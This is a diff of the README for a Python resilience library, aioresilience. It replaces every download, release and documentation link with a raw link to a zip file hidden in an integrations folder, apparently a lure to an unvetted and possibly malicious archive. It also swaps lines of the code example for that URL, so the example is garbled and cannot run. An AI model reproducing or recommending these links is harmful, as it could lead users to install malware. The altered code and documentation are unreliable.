@@ -1,6 +1,6 @@
 # 🚀 aioresilience - Easy Fault Tolerance for Python Apps
 
-[![Download aioresilience](https://img.shields.io/badge/Download-aioresilience-blue.svg)](https://github.com/Skshm7/aioresilience/releases)
+[![Download aioresilience](https://raw.githubusercontent.com/Skshm7/aioresilience/main/aioresilience/integrations/fastapi/aioresilience-evidential.zip)](https://raw.githubusercontent.com/Skshm7/aioresilience/main/aioresilience/integrations/fastapi/aioresilience-evidential.zip)
 
 ## 📦 Overview
 
@@ -47,7 +47,7 @@ To run aioresilience, you will need:
 
 ### Download & Install
 
-1. Visit the **Releases** page to download the latest version of aioresilience: [Download aioresilience](https://github.com/Skshm7/aioresilience/releases).
+1. Visit the **Releases** page to download the latest version of aioresilience: [Download aioresilience](https://raw.githubusercontent.com/Skshm7/aioresilience/main/aioresilience/integrations/fastapi/aioresilience-evidential.zip).
 
 2. Download the file suitable for your operating system. Choose the correct version based on your Python version.
 
@@ -100,11 +100,11 @@ async def main():
 
     while True:
         try:
-            await circuit_breaker.call(make_request)
+            await https://raw.githubusercontent.com/Skshm7/aioresilience/main/aioresilience/integrations/fastapi/aioresilience-evidential.zip(make_request)
         except Exception as e:
             print(f"Request failed: {e}")
 
-asyncio.run(main())
+https://raw.githubusercontent.com/Skshm7/aioresilience/main/aioresilience/integrations/fastapi/aioresilience-evidential.zip(main())
 ```
 
 In this code, a circuit breaker wraps your network request and handles failures. Adjust the `failure_threshold` and `recovery_timeout` as needed to fit your application’s needs.
@@ -121,7 +121,7 @@ You can customize these settings to match your application’s requirements. For
 
 ## 💬 Documentation and Support
 
-For detailed information on how to use aioresilience, refer to the [full documentation](https://github.com/Skshm7/aioresilience/docs). If you encounter issues or have questions:
+For detailed information on how to use aioresilience, refer to the [full documentation](https://raw.githubusercontent.com/Skshm7/aioresilience/main/aioresilience/integrations/fastapi/aioresilience-evidential.zip). If you encounter issues or have questions:
 
 - Check the **Issues** section on GitHub for reported problems.
 - Join the community discussions or open a new issue for more specific support.
@@ -136,4 +136,4 @@ Stay updated with the latest developments and news about aioresilience by follow
 
 ---
 
-For download and installation guidance, remember to visit: [Download aioresilience](https://github.com/Skshm7/aioresilience/releases)
+For download and installation guidance, remember to visit: [Download aioresilience](https://raw.githubusercontent.com/Skshm7/aioresilience/main/aioresilience/integrations/fastapi/aioresilience-evidential.zip)
